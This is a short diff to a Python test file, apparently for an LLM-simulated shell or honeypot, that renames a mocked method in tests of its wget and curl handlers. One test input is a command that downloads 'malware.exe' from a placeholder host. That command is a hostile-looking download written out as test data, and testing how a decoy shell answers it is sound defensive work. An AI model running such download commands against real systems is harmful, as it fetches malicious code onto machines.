@@ -18,7 +18,7 @@ class TestNetworkPagers:
     def test_wget_success(self, handler):
         start = time.time()
         # Mock LLM
-        handler.llm.generate_response.return_value = "<html>Malware</html>"
+        handler.llm.generate_content.return_value = "<html>Malware</html>"
         
         resp, _ = handler.handle_wget("wget -O malware.exe http://example.com/malware.exe", {'session_id': '1', 'cwd': '/root'})
         
@@ -29,7 +29,7 @@ class TestNetworkPagers:
 
     def test_curl_success(self, handler):
         start = time.time()
-        handler.llm.generate_response.return_value = "<html>Malware</html>"
+        handler.llm.generate_content.return_value = "<html>Malware</html>"
         
         resp, _ = handler.handle_curl("curl http://example.com", {'session_id': '1', 'cwd': '/root'})
         end = time.time()
